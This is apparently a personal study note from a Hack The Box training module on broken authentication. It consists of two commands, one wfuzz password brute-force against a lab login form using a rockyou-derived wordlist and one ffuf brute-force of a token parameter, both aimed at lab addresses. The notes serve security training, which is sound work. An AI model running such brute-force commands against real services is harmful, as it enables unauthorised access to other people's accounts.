---
{"dg-publish":true,"permalink":"/htb-module-writeups/broken-authorization-module-notes/"}
---

wfuzz -c -w filteredrockyou.txt -d "userid=htbuser&passwd=FUZZ&submit=submit" http://68.183.35.199:32650/


ffuf -w tokens.txt -u http://165.22.123.238:31638/question1 -X POST -d 'token=FUZZ&submit=check' -r -fs 1720

